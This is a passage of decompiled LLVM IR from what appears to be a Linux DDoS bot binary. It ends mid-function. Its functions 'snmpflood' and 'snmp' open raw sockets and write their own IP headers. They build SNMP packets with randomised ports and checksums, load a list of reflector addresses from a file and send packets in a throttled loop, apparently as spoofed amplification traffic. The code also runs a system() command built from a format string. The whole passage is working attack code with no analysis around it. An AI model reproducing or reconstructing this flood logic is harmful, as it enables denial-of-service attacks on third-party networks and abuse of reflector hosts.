  %v2_804a3f6 = call i32 @htonl(i32 64074)
  %v3_804a3f6 = trunc i32 %v2_804a3f6 to i16
  %sext = mul i32 %v2_804a3f6, 65536
  %v1_804a3fe = sdiv i32 %sext, 65536
  store i32 %v1_804a3fe, i32* @edx, align 4
  %v3_804a403 = add i32 %v4_804a3c4, 4
  %v4_804a403 = inttoptr i32 %v3_804a403 to i16*
  store i16 %v3_804a3f6, i16* %v4_804a403, align 2
  %v1_804a40a = add i32 %v4_804a3c4, 6
  %v2_804a40a = inttoptr i32 %v1_804a40a to i16*
  store i16 0, i16* %v2_804a40a, align 2
  %v1_804a413 = add i32 %v4_804a3c4, 8
  %v2_804a413 = inttoptr i32 %v1_804a413 to i8*
  store i8 -1, i8* %v2_804a413, align 1
  %v1_804a41a = add i32 %v4_804a3c4, 9
  %v2_804a41a = inttoptr i32 %v1_804a41a to i8*
  store i8 17, i8* %v2_804a41a, align 1
  %v1_804a421 = add i32 %v4_804a3c4, 10
  %v2_804a421 = inttoptr i32 %v1_804a421 to i16*
  store i16 0, i16* %v2_804a421, align 2
  %v2_804a42f = call i32 @inet_addr(i32 ptrtoint ([13 x i8]* @global_var_8068f18.87 to i32))
  %v3_804a43c = add i32 %v4_804a3c4, 12
  %v4_804a43c = inttoptr i32 %v3_804a43c to i32*
  store i32 %v2_804a42f, i32* %v4_804a43c, align 4
  %v2_804a43f = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a43f, i32* @ebp, align 4
  ret i32 %v4_804a3c4
}

define i32 @snmpflood() local_unnamed_addr {
entry:
  %tmp24 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %v2_804a450 = ptrtoint i32* %stack_var_-4124 to i32
  %v1_804a45c = add i32 %v2_804a450, 20
  %v5_804a45f = inttoptr i32 %v1_804a45c to i16*
  %v1_804a46e = add i32 %tmp24, 12
  %v2_804a46e = inttoptr i32 %v1_804a46e to i32*
  %v3_804a46e = load i32, i32* %v2_804a46e, align 4
  %v1_804a48c = add i32 %tmp24, 4
  %v2_804a48c = inttoptr i32 %v1_804a48c to i32*
  %v3_804a48c = load i32, i32* %v2_804a48c, align 4
  %v3_804a49b = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804a4a6 = icmp slt i32 %v3_804a49b, 0
  %v1_804a4aa = icmp eq i1 %v5_804a4a6, false
  br i1 %v1_804a4aa, label %entry.dec_label_pc_804a4b6_crit_edge, label %dec_label_pc_804a4ac

entry.dec_label_pc_804a4b6_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804a4b6

dec_label_pc_804a4ac:                             ; preds = %entry
  %v1_804a4b1 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804a4b6

dec_label_pc_804a4b6:                             ; preds = %entry.dec_label_pc_804a4b6_crit_edge, %dec_label_pc_804a4ac
  %v2_804a4bb = call i32 @__GI_time(i32* null)
  %v1_804a4c4 = call i32 @init_rand(i32 %v2_804a4bb)
  %v3_804a4e0 = bitcast i32* %stack_var_-4124 to i8*
  %v4_804a4e0 = call i32 @__GI_memset(i8* %v3_804a4e0, i32 0, i32 4096)
  store i32 %v4_804a4e0, i32* @eax, align 4
  %v2_804a4ee = call i32 @setup_ip_header(i8* %v3_804a4e0)
  %v2_804a4fc = call i32 @setup_snmp_header(i16* %v5_804a45f)
  %v0_804a504 = call i32 @random()
  %v2_804a514 = ashr i32 %v0_804a504, 31
  %v2_804a517 = zext i32 %v0_804a504 to i64
  %v4_804a517 = zext i32 %v2_804a514 to i64
  %v5_804a517 = mul nuw i64 %v4_804a517, 4294967296
  %v6_804a517 = or i64 %v5_804a517, %v2_804a517
  %v10_804a517 = srem i64 %v6_804a517, 65535
  %v11_804a517 = trunc i64 %v10_804a517 to i32
  %v1_804a51b = add i32 %v11_804a517, 64510
  %v1_804a520 = urem i32 %v1_804a51b, 65536
  %v1_804a529 = call i32 @htons(i32 %v1_804a520)
  %v2_804a529 = trunc i32 %v1_804a529 to i16
  store i16 %v2_804a529, i16* %v5_804a45f, align 4
  %v2_804a542 = add i32 %v2_804a450, 12
  %v3_804a542 = inttoptr i32 %v2_804a542 to i32*
  store i32 %v3_804a46e, i32* %v3_804a542, align 4
  %v1_804a548 = add i32 %v3_804a48c, 4
  %v2_804a548 = inttoptr i32 %v1_804a548 to i32*
  %v3_804a548 = load i32, i32* %v2_804a548, align 4
  %v2_804a54e = add i32 %v2_804a450, 16
  %v3_804a54e = inttoptr i32 %v2_804a54e to i32*
  store i32 %v3_804a548, i32* %v3_804a54e, align 4
  %v1_804a554 = or i32 %v2_804a450, 2
  %v2_804a554 = inttoptr i32 %v1_804a554 to i16*
  %v3_804a554 = load i16, i16* %v2_804a554, align 2
  %v3_804a558 = udiv i16 %v3_804a554, 2
  %v9_804a558 = zext i16 %v3_804a558 to i32
  %v2_804a568 = bitcast i32* %stack_var_-4124 to i16*
  %v3_804a568 = call i32 @csum(i16* %v2_804a568, i32 %v9_804a558)
  %v4_804a568 = trunc i32 %v3_804a568 to i16
  %v3_804a575 = add i32 %v2_804a450, 10
  %v4_804a575 = inttoptr i32 %v3_804a575 to i16*
  store i16 %v4_804a568, i16* %v4_804a575, align 2
  store i32 1, i32* %stack_var_-4144, align 4
  %v2_804a583 = ptrtoint i32* %stack_var_-4144 to i32
  %v5_804a59b = call i32 @__GI_setsockopt(i32 %v3_804a49b, i32 0, i32 3, i32 %v2_804a583, i32 4)
  %v2_804a5a3 = icmp slt i32 %v5_804a59b, 0
  %v1_804a5a5 = icmp eq i1 %v2_804a5a3, false
  br i1 %v1_804a5a5, label %dec_label_pc_804a5b1, label %dec_label_pc_804a5a7

dec_label_pc_804a5a7:                             ; preds = %dec_label_pc_804a4b6
  %v1_804a5ac = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804a5b1

dec_label_pc_804a5b1:                             ; preds = %dec_label_pc_804a4b6, %dec_label_pc_804a5a7
  %v2_804a5b6 = call i32 @__GI_time(i32* null)
  %v1_804a5bf = call i32 @init_rand(i32 %v2_804a5b6)
  %v3_804a62b = add i32 %v2_804a450, 4
  %v4_804a62b = inttoptr i32 %v3_804a62b to i16*
  br label %dec_label_pc_804a5d1

dec_label_pc_804a5d1:                             ; preds = %dec_label_pc_804a68a, %dec_label_pc_804a5b1
  %stack_var_-16.0 = phi i32 [ %v3_804a48c, %dec_label_pc_804a5b1 ], [ %v3_804a600, %dec_label_pc_804a68a ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804a5b1 ], [ %v4_804a68a, %dec_label_pc_804a68a ]
  %v3_804a5d9 = load i16, i16* %v2_804a554, align 2
  %v4_804a5d9 = zext i16 %v3_804a5d9 to i32
  %v6_804a5f5 = call i32 @sendto(i32 %v3_804a49b, i32 %v2_804a450, i32 %v4_804a5d9, i32 0, i32 %stack_var_-16.0, i32 16)
  %v1_804a600 = add i32 %stack_var_-16.0, 532
  %v2_804a600 = inttoptr i32 %v1_804a600 to i32*
  %v3_804a600 = load i32, i32* %v2_804a600, align 4
  %v1_804a60c = add i32 %v3_804a600, 4
  %v2_804a60c = inttoptr i32 %v1_804a60c to i32*
  %v3_804a60c = load i32, i32* %v2_804a60c, align 4
  store i32 %v3_804a60c, i32* %v3_804a54e, align 4
  %v1_804a615 = call i32 @rand_cmwc(i32 %v3_804a600)
  %v1_804a61e = call i32 @htonl(i32 %v1_804a615)
  %v2_804a61e = trunc i32 %v1_804a61e to i16
  store i16 %v2_804a61e, i16* %v4_804a62b, align 4
  %v3_804a632 = load i16, i16* %v2_804a554, align 2
  %v3_804a636 = udiv i16 %v3_804a632, 2
  %v9_804a636 = zext i16 %v3_804a636 to i32
  %v3_804a646 = call i32 @csum(i16* %v2_804a568, i32 %v9_804a636)
  %v4_804a646 = trunc i32 %v3_804a646 to i16
  store i16 %v4_804a646, i16* %v4_804a575, align 2
  %v0_804a657 = load i64, i64* @global_var_807d500.88, align 8
  %v1_804a657 = trunc i64 %v0_804a657 to i32
  %v1_804a65c = add i32 %v1_804a657, 1
  %v1_804a65d = sext i32 %v1_804a65c to i64
  store i64 %v1_804a65d, i64* @global_var_807d500.88, align 256
  %v0_804a662 = load i32, i32* @global_var_807d3c8.89, align 8
  %v6_804a66d = icmp ugt i32 %v0_804a662, %storemerge
  br i1 %v6_804a66d, label %dec_label_pc_804a5d1.dec_label_pc_804a68a_crit_edge, label %dec_label_pc_804a66f

dec_label_pc_804a5d1.dec_label_pc_804a68a_crit_edge: ; preds = %dec_label_pc_804a5d1
  br label %dec_label_pc_804a68a

dec_label_pc_804a66f:                             ; preds = %dec_label_pc_804a5d1
  %v0_804a679 = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804a682 = sext i32 %v0_804a679 to i64
  %v2_804a682 = call i32 @usleep(i64 %v1_804a682)
  br label %dec_label_pc_804a68a

dec_label_pc_804a68a:                             ; preds = %dec_label_pc_804a5d1.dec_label_pc_804a68a_crit_edge, %dec_label_pc_804a66f
  %stack_var_-4152.0 = phi i32 [ %storemerge, %dec_label_pc_804a5d1.dec_label_pc_804a68a_crit_edge ], [ 0, %dec_label_pc_804a66f ]
  %v4_804a68a = add i32 %stack_var_-4152.0, 1
  br label %dec_label_pc_804a5d1

; uselistorder directives
  uselistorder i32 %v3_804a600, { 1, 2, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804a450, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %stack_var_-4144, { 1, 0 }
  uselistorder i32 %tmp24, { 1, 0 }
  uselistorder label %dec_label_pc_804a68a, { 1, 0 }
  uselistorder label %dec_label_pc_804a5b1, { 1, 0 }
  uselistorder label %dec_label_pc_804a4b6, { 1, 0 }
}

define i32 @snmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-1088 = alloca i32, align 4
  %stack_var_-1148 = alloca i32, align 4
  %stack_var_-1132 = alloca i32, align 4
  %v15_804a69b = ptrtoint i32* %stack_var_-1132 to i32
  store i32 %v15_804a69b, i32* @eax, align 4
  store i32 %arg2, i32* %stack_var_-1148, align 4
  %v7_804a6ac = ptrtoint i32* %stack_var_-1148 to i32
  %v1_804a6af = call i32 @mfork(i32 %arg2)
  store i32 %v1_804a6af, i32* %eax.global-to-local, align 4
  %v1_804a6b7 = icmp eq i32 %v1_804a6af, 0
  %v1_804a6b9 = icmp eq i1 %v1_804a6b7, false
  br i1 %v1_804a6b9, label %dec_label_pc_804ac11, label %dec_label_pc_804a6bf

dec_label_pc_804a6bf:                             ; preds = %entry
  store i32 2, i32* %stack_var_-1148, align 4
  %v3_804a6cb = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_804a6cb, i32* %eax.global-to-local, align 4
  %v5_804a6d6 = icmp slt i32 %v3_804a6cb, 0
  %v1_804a6da = icmp eq i1 %v5_804a6d6, false
  br i1 %v1_804a6da, label %dec_label_pc_804a6e6, label %dec_label_pc_804a6dc

dec_label_pc_804a6dc:                             ; preds = %dec_label_pc_804a6bf
  store i32 1, i32* %stack_var_-1148, align 4
  %v1_804a6e1 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804a6e1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a6e6

dec_label_pc_804a6e6:                             ; preds = %dec_label_pc_804a6bf, %dec_label_pc_804a6dc
  %v4_804a6e6 = add i32 %arg3, -5
  %v9_804a6e6 = sub i32 4, %arg3
  %v10_804a6e6 = and i32 %v9_804a6e6, %arg3
  %v11_804a6e6 = icmp slt i32 %v10_804a6e6, 0
  %v12_804a6e6 = icmp eq i32 %v4_804a6e6, 0
  %v13_804a6e6 = icmp slt i32 %v4_804a6e6, 0
  %v3_804a6ea = icmp eq i1 %v13_804a6e6, %v11_804a6e6
  %v4_804a6ea = icmp eq i1 %v12_804a6e6, false
  %v5_804a6ea = and i1 %v4_804a6ea, %v3_804a6ea
  br i1 %v5_804a6ea, label %dec_label_pc_804a70c, label %dec_label_pc_804a6ec

dec_label_pc_804a6ec:                             ; preds = %dec_label_pc_804a6e6
  %v3_804a6fa = call i32 @Send(i32 %arg1, i32 ptrtoint ([99 x i8]* @global_var_8068f28.91 to i32))
  store i32 %v3_804a6fa, i32* %eax.global-to-local, align 4
  %v2_804a707 = call i32 @__GI_exit(i32 -1)
  store i32 %v2_804a707, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a70c

dec_label_pc_804a70c:                             ; preds = %dec_label_pc_804a6e6, %dec_label_pc_804a6ec
  %v1_804a70f = add i32 %arg4, 12
  store i32 %v1_804a70f, i32* %eax.global-to-local, align 4
  %v1_804a712 = inttoptr i32 %v1_804a70f to i32*
  %v2_804a712 = load i32, i32* %v1_804a712, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804a71f = and i32 %v2_804a712, -256
  store i32 %v1_804a71f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804a722 = inttoptr i32 %v2_804a712 to i8*
  %v3_804a728 = call i32 @_strlen(i8* %v4_804a722)
  %v4_804a728 = mul i32 %v3_804a728, -1
  %v5_804a728 = add i32 %v4_804a728, -2
  store i32 %v5_804a728, i32* %ecx.global-to-local, align 4
  %v1_804a72e = sub i32 0, %v4_804a728
  store i32 %v1_804a72e, i32* %edx.global-to-local, align 4
  %v2_804a736 = mul i32 %v3_804a728, 5
  %v1_804a738 = add i32 %v2_804a736, 165
  store i32 %v1_804a738, i32* %eax.global-to-local, align 4
  %v4_804a740 = add i32 %v2_804a736, -858
  %v9_804a740 = sub i32 857, %v2_804a736
  %v10_804a740 = and i32 %v9_804a740, %v1_804a738
  %v11_804a740 = icmp slt i32 %v10_804a740, 0
  %v12_804a740 = icmp eq i32 %v4_804a740, 0
  %v13_804a740 = icmp slt i32 %v4_804a740, 0
  %v3_804a747 = icmp eq i1 %v13_804a740, %v11_804a740
  %v4_804a747 = icmp eq i1 %v12_804a740, false
  %v5_804a747 = and i1 %v4_804a747, %v3_804a747
  br i1 %v5_804a747, label %dec_label_pc_804ac11, label %dec_label_pc_804a74d

dec_label_pc_804a74d:                             ; preds = %dec_label_pc_804a70c
  store i32 %v1_804a70f, i32* %eax.global-to-local, align 4
  %v2_804a753 = load i32, i32* %v1_804a712, align 4
  store i32 %v2_804a753, i32* %edx.global-to-local, align 4
  store i32 %v1_804a70f, i32* %eax.global-to-local, align 4
  %v2_804a75b = load i32, i32* %v1_804a712, align 4
  store i32 %v2_804a75b, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a70f, i32* %eax.global-to-local, align 4
  %v2_804a763 = load i32, i32* %v1_804a712, align 4
  store i32 %v2_804a763, i32* @ebx, align 4
  store i32 %v1_804a70f, i32* %eax.global-to-local, align 4
  %v2_804a76b = load i32, i32* %v1_804a712, align 4
  store i32 %v2_804a76b, i32* @esi, align 4
  store i32 %v1_804a70f, i32* %eax.global-to-local, align 4
  %v2_804a773 = load i32, i32* %v1_804a712, align 4
  store i32 %v1_804a738, i32* @edi, align 4
  %v2_804a783 = ptrtoint i32* %stack_var_-1088 to i32
  store i32 %v2_804a783, i32* %eax.global-to-local, align 4
  %v9_804a78a = call i32 @__GI_snprintf(i32 %v2_804a783, i32 %v1_804a738, i32 ptrtoint ([176 x i8]* @global_var_8068f8c.92 to i32), i32 %v2_804a773, i32 %v2_804a76b, i32 %v2_804a763, i32 %v2_804a75b)
  store i32 %v2_804a783, i32* %eax.global-to-local, align 4
  %v2_804a79c = call i32 @system(i32 %v2_804a783)
  store i32 %v2_804a79c, i32* %eax.global-to-local, align 4
  %v3_804a7a9 = call i32 @__GI_time(i32* null)
  store i32 %v3_804a7a9, i32* %eax.global-to-local, align 4
  %v2_804a7b5 = call i32 @srand(i32 %v3_804a7a9)
  store i32 0, i32* @global_var_807e520.80, align 32
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804a7dc = call i32 @malloc(i32 128)
  store i32 %v2_804a7dc, i32* %edx.global-to-local, align 4
  %v1_804a7ed = inttoptr i32 %v2_804a7dc to i8*
  store i32 %v2_804a7dc, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 128, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a7f4 = call i8* @_memset(i8* %v1_804a7ed, i32 0, i32 128)
  %v6_804a7f4 = ptrtoint i8* %v5_804a7f4 to i32
  store i32 %v6_804a7f4, i32* %ecx.global-to-local, align 4
  %v0_804a7f6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804a7fe = add i32 %arg4, 16
  store i32 %v1_804a7fe, i32* %eax.global-to-local, align 4
  %v1_804a801 = inttoptr i32 %v1_804a7fe to i32*
  %v2_804a801 = load i32, i32* %v1_804a801, align 4
  store i32 %v2_804a801, i32* %eax.global-to-local, align 4
  %v2_804a807 = call i32 @atol(i32 %v2_804a801)
  %v1_804a815 = add i32 %arg4, 20
  store i32 %v1_804a815, i32* %eax.global-to-local, align 4
  %v1_804a818 = inttoptr i32 %v1_804a815 to i32*
  %v2_804a818 = load i32, i32* %v1_804a818, align 4
  store i32 %v2_804a818, i32* %eax.global-to-local, align 4
  %v2_804a81e = call i32 @atol(i32 %v2_804a818)
  store i32 %v2_804a81e, i32* @eax, align 4
  store i32 0, i32* @global_var_807d3c8.89, align 8
  store i64 0, i64* @global_var_807d500.88, align 256
  %v3_804a851 = call i32 @__GI_fopen(i32 ptrtoint ([9 x i8]* @global_var_806903c.93 to i32), i32 ptrtoint ([2 x i8]* @global_var_8068ea3.83 to i32))
  store i32 %v3_804a851, i32* %eax.global-to-local, align 4
  %v8_804a9d3 = inttoptr i32 %v0_804a7f6 to i8*
  %v1_804a86f = and i32 %v0_804a7f6, -256
  %v5_804a8d3 = add i32 %v0_804a7f6, -1
  br label %dec_label_pc_804a9ca.outer

dec_label_pc_804a861:                             ; preds = %dec_label_pc_804a9ca
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a86f, i32* %eax.global-to-local, align 4
  %v3_804a878 = call i32 @_strlen(i8* %v8_804a9d3)
  %v4_804a878 = mul i32 %v3_804a878, -1
  %v5_804a878 = add i32 %v4_804a878, -2
  store i32 %v5_804a878, i32* %ecx.global-to-local, align 4
  %v5_804a87f = sub i32 %v0_804a7f6, %v4_804a878
  %v1_804a882 = add i32 %v5_804a87f, -1
  store i32 %v1_804a882, i32* %eax.global-to-local, align 4
  %v1_804a883 = inttoptr i32 %v1_804a882 to i8*
  %v2_804a883 = load i8, i8* %v1_804a883, align 1
  %v3_804a883 = zext i8 %v2_804a883 to i32
  %v5_804a883 = and i32 %v1_804a882, -256
  %v6_804a883 = or i32 %v3_804a883, %v5_804a883
  store i32 %v6_804a883, i32* %eax.global-to-local, align 4
  %v10_804a885 = icmp eq i8 %v2_804a883, 10
  br i1 %v10_804a885, label %dec_label_pc_804a8b5, label %dec_label_pc_804a889

dec_label_pc_804a889:                             ; preds = %dec_label_pc_804a861
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a86f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804a7f6, i32* @edi, align 4
  %v3_804a8a0 = call i32 @_strlen(i8* %v8_804a9d3)
  %v4_804a8a0 = mul i32 %v3_804a8a0, -1
  %v5_804a8a0 = add i32 %v4_804a8a0, -2
  store i32 %v5_804a8a0, i32* @ecx, align 4
  %v5_804a8a7 = sub i32 %v0_804a7f6, %v4_804a8a0
  %v1_804a8aa = add i32 %v5_804a8a7, -1
  store i32 %v1_804a8aa, i32* %eax.global-to-local, align 4
  %v1_804a8ab = inttoptr i32 %v1_804a8aa to i8*
  %v2_804a8ab = load i8, i8* %v1_804a8ab, align 1
  %v3_804a8ab = zext i8 %v2_804a8ab to i32
  %v5_804a8ab = and i32 %v1_804a8aa, -256
  %v6_804a8ab = or i32 %v3_804a8ab, %v5_804a8ab
  store i32 %v6_804a8ab, i32* %eax.global-to-local, align 4
  %v10_804a8ad = icmp eq i8 %v2_804a8ab, 13
  %v1_804a8af = icmp eq i1 %v10_804a8ad, false
  br i1 %v1_804a8af, label %dec_label_pc_804a9ca, label %dec_label_pc_804a8b5

dec_label_pc_804a8b5:                             ; preds = %dec_label_pc_804a889, %dec_label_pc_804a861
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804a86f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804a7f6, i32* @edi, align 4
  %v3_804a8cc = call i32 @_strlen(i8* %v8_804a9d3)
  %v4_804a8cc = mul i32 %v3_804a8cc, -1
  %v5_804a8cc = add i32 %v4_804a8cc, -2
  store i32 %v5_804a8cc, i32* @ecx, align 4
  %v1_804a8d6 = sub i32 %v5_804a8d3, %v4_804a8cc
  %v1_804a8d7 = inttoptr i32 %v1_804a8d6 to i8*
  store i8 0, i8* %v1_804a8d7, align 1
  %v0_804a8da = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804a8da, i32* %eax.global-to-local, align 4
  %v1_804a8df = icmp eq i32 %v0_804a8da, 0
  %v1_804a8e1 = icmp eq i1 %v1_804a8df, false
  %v2_804a95b = call i32 @malloc(i32 540)
  store i32 %v2_804a95b, i32* %eax.global-to-local, align 4
  br i1 %v1_804a8e1, label %dec_label_pc_804a953, label %dec_label_pc_804a8e3

dec_label_pc_804a8e3:                             ; preds = %dec_label_pc_804a8b5
  store i32 %v2_804a95b, i32* @global_var_807e520.80, align 32
  store i32 %v2_804a95b, i32* %eax.global-to-local, align 4
  %v1_804a8fd = inttoptr i32 %v2_804a95b to i32*
  store i32 0, i32* %v1_804a8fd, align 4
  %v0_804a903 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a903 = add i32 %v0_804a903, 4
  %v2_804a903 = inttoptr i32 %v1_804a903 to i32*
  store i32 0, i32* %v2_804a903, align 4
  %v0_804a90a = load i32, i32* %eax.global-to-local, align 4
  %v1_804a90a = add i32 %v0_804a90a, 8
  %v2_804a90a = inttoptr i32 %v1_804a90a to i32*
  store i32 0, i32* %v2_804a90a, align 4
  %v0_804a911 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a911 = add i32 %v0_804a911, 12
  %v2_804a911 = inttoptr i32 %v1_804a911 to i32*
  store i32 0, i32* %v2_804a911, align 4
  %v0_804a918 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804a918, i32* @ebx, align 4
  %v2_804a924 = call i32 @inet_addr(i32 %v0_804a7f6)
  %v1_804a92c = load i32, i32* @ebx, align 4
  %v2_804a92c = add i32 %v1_804a92c, 4
  %v3_804a92c = inttoptr i32 %v2_804a92c to i32*
  store i32 %v2_804a924, i32* %v3_804a92c, align 4
  %v0_804a92f = load i32, i32* @global_var_807e520.80, align 32
  %v2_804a93a = add i32 %v0_804a92f, 532
  %v3_804a93a = inttoptr i32 %v2_804a93a to i32*
  store i32 %v0_804a92f, i32* %v3_804a93a, align 4
  %v0_804a940 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804a940, i32* @edx, align 4
  store i32 %v0_804a940, i32* %eax.global-to-local, align 4
  %v2_804a94b = add i32 %v0_804a940, 536
  %v3_804a94b = inttoptr i32 %v2_804a94b to i32*
  store i32 %v0_804a940, i32* %v3_804a94b, align 4
  br label %dec_label_pc_804a9c7

dec_label_pc_804a953:                             ; preds = %dec_label_pc_804a8b5
  store i32 %v2_804a95b, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v5_804a976 = inttoptr i32 %v2_804a95b to i8*
  %v5_804a977 = call i32 @__GI_memset(i8* %v5_804a976, i32 0, i32 540)
  store i32 %v5_804a977, i32* %eax.global-to-local, align 4
  %v2_804a985 = call i32 @inet_addr(i32 %v0_804a7f6)
  %v2_804a992 = add i32 %v2_804a95b, 4
  %v3_804a992 = inttoptr i32 %v2_804a992 to i32*
  store i32 %v2_804a985, i32* %v3_804a992, align 4
  %v0_804a995 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804a995, i32* %edx.global-to-local, align 4
  %v2_804a99e = add i32 %v2_804a95b, 536
  %v3_804a99e = inttoptr i32 %v2_804a99e to i32*
  store i32 %v0_804a995, i32* %v3_804a99e, align 4
  %v0_804a9a4 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804a9a4, i32* %eax.global-to-local, align 4
  %v1_804a9a9 = add i32 %v0_804a9a4, 532
  %v2_804a9a9 = inttoptr i32 %v1_804a9a9 to i32*
  %v3_804a9a9 = load i32, i32* %v2_804a9a9, align 4
  %v2_804a9b2 = add i32 %v2_804a95b, 532
  %v3_804a9b2 = inttoptr i32 %v2_804a9b2 to i32*
  store i32 %v3_804a9a9, i32* %v3_804a9b2, align 4
  %v0_804a9b8 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804a9b8, i32* @edx, align 4
  store i32 %v2_804a95b, i32* %eax.global-to-local, align 4
  %v2_804a9c1 = add i32 %v0_804a9b8, 532
  %v3_804a9c1 = inttoptr i32 %v2_804a9c1 to i32*
  store i32 %v2_804a95b, i32* %v3_804a9c1, align 4
  br label %dec_label_pc_804a9c7

dec_label_pc_804a9c7:                             ; preds = %dec_label_pc_804a8e3, %dec_label_pc_804a953
  br label %dec_label_pc_804a9ca.outer

dec_label_pc_804a9ca.outer:                       ; preds = %dec_label_pc_804a9c7, %dec_label_pc_804a74d
  br label %dec_label_pc_804a9ca

dec_label_pc_804a9ca:                             ; preds = %dec_label_pc_804a9ca.outer, %dec_label_pc_804a889
  %v4_804a9d6 = call i32 @fgets(i32 %v0_804a7f6, i32 128, i32 %v3_804a851)
  store i32 %v4_804a9d6, i32* %eax.global-to-local, align 4
  %v1_804a9de = icmp eq i32 %v4_804a9d6, 0
  %v1_804a9e0 = icmp eq i1 %v1_804a9de, false
  br i1 %v1_804a9e0, label %dec_label_pc_804a861, label %dec_label_pc_804a9e6

dec_label_pc_804a9e6:                             ; preds = %dec_label_pc_804a9ca
  %v0_804a9e6 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804a9e6, i32* %eax.global-to-local, align 4
  %v1_804a9eb = add i32 %v0_804a9e6, 532
  %v2_804a9eb = inttoptr i32 %v1_804a9eb to i32*
  %v3_804a9eb = load i32, i32* %v2_804a9eb, align 4
  %v1_804aa00 = add i32 %arg4, 4
  store i32 %v1_804aa00, i32* %eax.global-to-local, align 4
  %v1_804aa03 = inttoptr i32 %v1_804aa00 to i32*
  %v2_804aa03 = load i32, i32* %v1_804aa03, align 4
  store i32 %v2_804aa03, i32* %eax.global-to-local, align 4
  %v2_804aa09 = call i32 @inet_addr(i32 %v2_804aa03)
  %v1_804aa1a = mul i32 %v2_804a807, 4
  store i32 %v1_804aa1a, i32* %edx.global-to-local, align 4
  %v2_804aa28 = mul i32 %v2_804a807, 28
  %v1_804aa2d = add i32 %v2_804aa28, 30
  %v2_804aa30 = and i32 %v1_804aa2d, -16
  %v2_804aa36 = sub i32 %v7_804a6ac, %v2_804aa30
  %v1_804aa44 = add i32 %v2_804aa36, 15
  %v2_804aa47 = and i32 %v1_804aa44, -16
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804ab0c61 = icmp sgt i32 %v2_804a807, 0
  br i1 %v5_804ab0c61, label %dec_label_pc_804aa68.lr.ph, label %dec_label_pc_804ab12

dec_label_pc_804aa68.lr.ph:                       ; preds = %dec_label_pc_804a9e6
  %v3_804aa9c = or i32 %v2_804aa47, 8
  br label %dec_label_pc_804aa68

dec_label_pc_804aa68:                             ; preds = %dec_label_pc_804aa68, %dec_label_pc_804aa68.lr.ph
  %storemerge462 = phi i32 [ 0, %dec_label_pc_804aa68.lr.ph ], [ %v4_804ab03, %dec_label_pc_804aa68 ]
  %v1_804aa6e = mul i32 %storemerge462, 4
  %v2_804aa7c = mul i32 %storemerge462, 28
  %v3_804aa81 = add i32 %v2_804aa7c, %v2_804aa47
  %v4_804aa81 = inttoptr i32 %v3_804aa81 to i32*
  store i32 %storemerge462, i32* %v4_804aa81, align 4
  store i32 %v2_804aa47, i32* %ecx.global-to-local, align 4
  store i32 %v2_804aa7c, i32* %edx.global-to-local, align 4
  %v4_804aa9c = add i32 %v3_804aa9c, %v2_804aa7c
  %v5_804aa9c = inttoptr i32 %v4_804aa9c to i32*
  store i32 2, i32* %v5_804aa9c, align 4
  %v1_804aaa6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804aaa6 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804aaa6 = add i32 %v1_804aaa6, 12
  %v4_804aaa6 = add i32 %v3_804aaa6, %v2_804aaa6
  %v5_804aaa6 = inttoptr i32 %v4_804aaa6 to i32*
  store i32 %v2_804aa09, i32* %v5_804aaa6, align 4
  %v1_804aab0 = load i32, i32* %edx.global-to-local, align 4
  %v2_804aab0 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804aab0 = add i32 %v1_804aab0, 16
  %v4_804aab0 = add i32 %v3_804aab0, %v2_804aab0
  %v5_804aab0 = inttoptr i32 %v4_804aab0 to i32*
  %v1_804aaba = load i32, i32* %edx.global-to-local, align 4
  %v2_804aaba = load i32, i32* %ecx.global-to-local, align 4
  %v3_804aaba = add i32 %v1_804aaba, 20
  %v4_804aaba = add i32 %v3_804aaba, %v2_804aaba
  %v5_804aaba = inttoptr i32 %v4_804aaba to i32*
  %v1_804aad6 = add i32 %v3_804aa81, 4
  %v2_804aadc = inttoptr i32 %v1_804aad6 to i32*
  store i32 %v3_804a9eb, i32* %v2_804aadc, align 4
